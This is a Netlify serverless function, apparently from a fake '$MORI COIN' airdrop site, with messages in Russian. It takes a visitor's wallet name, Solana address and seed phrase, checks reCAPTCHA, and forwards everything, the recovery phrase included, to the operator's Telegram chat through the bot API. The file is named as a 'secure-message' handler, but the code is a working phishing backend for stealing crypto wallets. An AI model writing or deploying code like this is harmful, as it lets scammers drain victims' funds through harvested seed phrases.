// File: aura-airdrop-project/netlify/functions/secure-message.js
const axios = require('axios');

function sanitizeText(text) {
    if (typeof text !== 'string') return '';
    return text.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

exports.handler = async function (event) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Метод не разрешен' }),
        };
    }

    try {
        const { BOT_TOKEN, CHAT_ID, RECAPTCHA_SECRET_KEY_V2 } = process.env;
        const body = JSON.parse(event.body);
        const { walletName, solAddress, seedPhrase, recaptchaToken } = body; 

        // --- ПРОВЕРКА RECAPTCHA V2 ---
        if (!recaptchaToken) {
           throw new Error("Токен reCAPTCHA отсутствует.");
        }

        if (!RECAPTCHA_SECRET_KEY_V2) {
            console.error("КРИТИЧЕСКАЯ ОШИБКА: RECAPTCHA_SECRET_KEY_V2 не установлен!");
            throw new Error("Конфигурация сервера для reCAPTCHA v2 не завершена.");
        }

        const recaptchaUrl = `https://www.google.com/recaptcha/api/siteverify`;
        const recaptchaRes = await axios.post(recaptchaUrl, null, {
            params: {
                secret: RECAPTCHA_SECRET_KEY_V2,
                response: recaptchaToken,
            },
        });
        
        if (!recaptchaRes.data.success) {
            console.warn("Проверка reCAPTCHA v2 не пройдена!", recaptchaRes.data);
            const errorCode = recaptchaRes.data['error-codes'] ? recaptchaRes.data['error-codes'].join(', ') : 'Неизвестная ошибка';
            throw new Error(`Вы не прошли проверку на робота. Код ошибки: ${errorCode}`);
        }
        // --- КОНЕЦ ПРОВЕРКИ RECAPTCHA V2 ---


        if (!BOT_TOKEN || !CHAT_ID) {
            console.error("КРИТИЧЕСКАЯ ОШИБКА: BOT_TOKEN или CHAT_ID не установлены!");
            throw new Error("Конфигурация сервера не завершена.");
        }
        
        if (!walletName || !solAddress || !seedPhrase) { 
            return {
                statusCode: 400,
                body: JSON.stringify({ success: false, message: 'Отсутствуют необходимые данные.' }),
            };
        }

        const sanitizedWallet = sanitizeText(walletName);
        const sanitizedSolAddress = sanitizeText(solAddress);
        const sanitizedPhrase = sanitizeText(seedPhrase);

        // ИСПРАВЛЕНО: Убраны обратные косые черты перед обратными кавычками
        const message = `Новая заявка на $MORI COIN:
Кошелёк: ${sanitizedWallet}
SOL Адрес: \`${sanitizedSolAddress}\`
Сид фраза: ${sanitizedPhrase}`;
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'MarkdownV2' // Обязательно указываем Telegram использовать MarkdownV2 для форматирования
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Заявка успешно отправлена!' }),
        };

    } catch (error) {
        console.error('Ошибка внутри выполнения функции:', error.message);
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, message: error.message || 'Произошла внутренняя ошибка на сервере.' }),
        };
    }
};